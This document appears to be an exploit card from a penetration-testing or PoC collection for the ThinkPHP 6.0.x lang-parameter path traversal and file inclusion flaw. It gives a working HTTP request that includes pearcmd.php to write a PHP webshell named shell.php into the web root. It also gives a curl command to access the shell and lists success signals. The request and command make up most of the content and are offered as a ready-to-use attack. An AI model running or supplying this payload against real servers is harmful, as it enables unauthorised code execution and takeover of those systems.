# ThinkPHP Lang RCE (lang-rce)

## 指纹特征
- 服务: ThinkPHP 6.0.x (< 6.0.13)
- 场景: 开启多语言支持且 lang 参数未过滤

## 利用矩阵
| 触发方式 | 路径 | 权限要求 |
| :--- | :--- | :--- |
| 路径遍历 + 包含 | `/?lang=...` | 无 |

## PoC 指令

通过利用 `lang` 参数包含 `pearcmd.php` 实现 Webshell 写入：

**1. 包含并写入**
```http
GET /?+config-create+/&lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=phpinfo()?>+shell.php HTTP/1.1
Host: {{TARGET}}:8080
```

**2. 访问 Shell**
```bash
curl http://{{TARGET}}:8080/shell.php
```

## Success Signal
- **物理验证**: 服务器在 Web 根目录生成了 `shell.php`。
- **状态验证**: Webshell 可执行代码。
